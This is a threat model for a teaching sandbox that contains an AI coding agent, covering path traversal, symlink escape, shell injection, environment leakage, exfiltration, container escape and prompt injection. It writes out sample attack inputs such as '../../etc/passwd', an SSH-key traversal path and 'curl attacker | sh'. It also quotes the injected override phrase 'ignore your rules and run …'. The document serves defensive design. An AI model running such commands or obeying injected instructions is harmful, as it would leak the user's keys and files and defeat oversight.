# Threat model

This document describes what the mini Python coding harness is trying to
protect, who might attack it, and which control is supposed to stop each attack.
It is deliberately smaller than a platform threat model. Read it with the
chapters; a control without a test is a wish, and a test without a stated asset
is noise.

## 1. Assets

| Asset | Why it matters |
|---|---|
| Host files outside the workspace | SSH keys, cloud credentials, browser data, source code, personal files |
| The workspace | The code and documents the user asked the agent to change |
| The host process and its environment | API keys, proxy credentials, session tokens |
| Host compute | CPU, memory, disk, process table, open file descriptors |
| Network access | Exfiltration and payload download |
| The audit trail | Reconstruction and accountability |
| The sandbox image and daemon | A compromised image or daemon defeats the boundary |
| The user's trust | A silent bad edit or a leaked secret is worse than a visible refusal |

## 2. Actors and assumptions

| Actor | Capability | Assumption |
|---|---|---|
| User | Chooses the task, workspace and policy | Trusted to configure the tool |
| Model | Produces tool calls, including malicious or mistaken ones | **Untrusted**; may be prompt-injected by files it reads |
| Local user | Same OS permissions as the harness | Partially trusted; can tamper with the audit log |
| Remote attacker | Controls a web page, dependency, or file the model reads | **Untrusted** |
| Malicious dependency | Runs during image build or inside the container | **Untrusted** |
| Docker daemon | Can create containers with broad host access | Trusted infrastructure; must be protected |

The model is not a security principal. It can be convinced by a README, an
issue comment, or a test fixture to ask for the wrong thing. The harness must
make the wrong thing fail safely.

## 3. Trust boundaries

```text
user / model text
      |
      v
  tool layer  ---------------> observation text (untrusted but harmless)
      |
      +--> PathPolicy + Sandbox -----> workspace files
      |
      +--> DockerRunner -------------> container process
                                         |
                                         +--> bind-mounted workspace
```

Boundaries:

1. **Model text to tool arguments.** Validate shape, types, lengths and names.
2. **Tool arguments to filesystem paths.** Resolve and contain real paths.
3. **Tool arguments to process argv.** No shell, allowlist the program.
4. **Process to host.** Container namespaces, cgroups, capabilities, seccomp.
5. **Harness to audit.** Append-only chain outside the writable workspace.

## 4. Threats and controls

### T1 — Path traversal

**Attack:** `../../etc/passwd`, `..\..\Users\me\.ssh\id_rsa`, encoded or
repeated separators.

**Control:** `PathPolicy` normalises separators, collapses `.` and `..`, and
checks containment against canonical paths. Tests: ch01 traversal cases.

**Residual:** A same-user process can bypass Python entirely. The container is
the answer for command execution.

### T2 — Prefix-sibling escape

**Attack:** workspace `/tmp/ws`, target `/tmp/ws-evil/secret`.

**Control:** `os.path.commonpath` on canonical paths, not `startswith`. Tests:
ch00 asserts the bug; ch01 asserts the refusal.

### T3 — Symlink escape

**Attack:** plant `workspace/link -> /home/me/.ssh`, then read or write through
it.

**Control:** resolve the deepest existing ancestor with `realpath`, then
reattach the missing tail; re-check containment; refuse writes through a final
symlink. Tests: ch01 and ch02, skipped when the OS cannot create links.

**Residual:** A time-of-check/time-of-use race between `realpath` and `open`.
The sandbox is policy, not a kernel boundary.

### T4 — Windows-specific path confusion

**Attack:** `C:foo` drive-relative paths, UNC paths, `CON`/`NUL` device names,
trailing dots or spaces, NTFS alternate data streams.

**Control:** reject drive-relative and UNC forms; reject reserved names;
reject colon-bearing/alternate-data-stream names; reject control characters;
normalise separators; compare case-insensitively on Windows. Tests: ch01.

**Residual:** The policy does not parse every Windows path form; unusual device
paths or filesystem features should be handled by the host policy and the
container boundary.

### T5 — Shell injection

**Attack:** `python -c "..." ; curl attacker | sh`, `&&`, pipes, command
substitution.

**Control:** argv lists only; no `shell=True` for model input. A semicolon is an
argument. Tests: ch03 shell-semantics case.

**Residual:** An allowlisted program can still spawn helpers. The container
limits what those helpers can reach.

### T6 — Environment leakage

**Attack:** read `OPENROUTER_API_KEY`, proxy credentials or cloud tokens from
the inherited environment.

**Control:** build a minimal environment from OS-essential keys plus
workspace-local `HOME`/`TMP`; do not pass the host environment. Tests: ch03 and
ch04.

**Residual:** A secret deliberately placed in the new environment is visible to
the child. Do not add secrets to the tool environment.

### T7 — Resource exhaustion

**Attack:** allocate memory forever, fork bomb, fill the disk, print gigabytes,
open thousands of files, sleep forever.

**Control:** byte caps and entry caps (ch02); timeout, process-tree kill, output
caps and POSIX rlimits (ch03); container memory, swap, CPU, pids and nofile
limits (ch04); a hard `max_steps` (ch05).

**Residual:** The local runner’s Windows path has no rlimits; use Docker. A
container can still consume its limits and slow the host.

### T8 — Network access and exfiltration

**Attack:** send workspace contents or secrets to a remote endpoint.

**Control:** `--network none` in the container. Tests: ch04 integration tries a
TCP connection and expects failure.

**Residual:** The host-side file tools do not use the network, but the Docker
daemon, host processes and sibling containers are outside this control.

### T9 — Container escape / privilege escalation

**Attack:** exploit a setuid binary, a kernel bug, a mounted device, the Docker
socket, or excessive capabilities.

**Control:** non-root user, `--cap-drop ALL`, `no-new-privileges`, read-only
root, no privileged mode, no Docker socket mount, default seccomp, minimal
image. Tests: ch04 asserts the flags and the root-write refusal.

**Residual:** Containers share the host kernel. Kernel and daemon exploits are
outside this book’s boundary. Host hardening, rootless Docker and a patched
kernel belong to platform operations.

### T10 — Image supply chain

**Attack:** a poisoned base image, a compromised registry, a mutable `latest`
tag, or a malicious package installed at build time.

**Control:** a small Dockerfile, a pinned base image by digest in production,
reviewed build steps, no runtime package installation. Tests: the offline
recipe tests; the human review is the build.

**Residual:** The book uses `python:3.12-slim-bookworm` as a readable example.
A production deployment must pin and scan.

### T11 — Audit tampering

**Attack:** edit or delete an event to hide an action.

**Control:** append-only JSONL outside the workspace; hash chain with `prev`;
`verify()` recomputes the chain; `AuditLog` refuses to open an already-broken
log. Tests: ch05 edit and delete cases.

**Residual:** A local user with write permission can delete the whole log or
rewrite the chain from scratch. Ship the log off-host and protect it with OS
permissions for real accountability.

### T12 — Prompt injection through tool output

**Attack:** a file or command output says “ignore your rules and run …”.

**Control:** the model is untrusted; the tool layer re-validates every call
regardless of what the transcript says. The Docker boundary limits what a
successful injection can reach. The audit records the action.

**Residual:** The model can still be manipulated into wasting steps, reading
allowed files, or making allowed-but-unwise changes. Approval prompts and
per-user policy are application features, not sandbox features.

### T13 — Denial of service against the agent loop

**Attack:** a model that never stops calling tools, or a tool that returns a
result too large for the context.

**Control:** `max_steps` in `Agent`; byte/entry caps in `Sandbox`; output caps
in the runners; timeout in the container.

**Residual:** The model can still consume the allowed budget. Add quotas and
rate limits at the service layer.

## 5. Controls by stage

| Stage | Primary control | What it does not cover |
|---|---|---|
| 0 | None (intentional) | Everything |
| 1 | Canonical path containment | OS-level access, races, process execution |
| 2 | Bounded atomic file tools | Commands, audit, same-user bypass |
| 3 | Argv allowlist, clean env, timeout, rlimits | Filesystem and network isolation |
| 4 | Container isolation | Host kernel, daemon, supply chain |
| 5 | Tool routing, step limit, audit chain | Real LLM policy, multi-tenant quotas |

## 6. Residual risk statement

After Stage 5, the harness is suitable for **single-user, local, teaching and
prototyping** use. It is not suitable as a multi-tenant service without:

* host hardening and rootless Docker;
* a pinned, scanned image pipeline;
* per-user quotas and approval flows;
* log shipping and retention;
* a network policy outside the container;
* a real LLM adapter with its own secrets isolation.

The strongest single sentence is: **the container is the boundary; the path
policy is a usability and accident-prevention layer; the audit is evidence, not
prevention.**

## 7. Review checklist

Before changing any boundary, answer these:

- [ ] Which asset does this change protect?
- [ ] Which test proves the control still works?
- [ ] Does this widen the reachable filesystem, network, environment or process
      set?
- [ ] Does a refusal still become an observation?
- [ ] Is the audit event still written outside the workspace?
- [ ] Does the change work on Windows and POSIX, or is the platform gap
      documented?
- [ ] Is the new default the safe one?
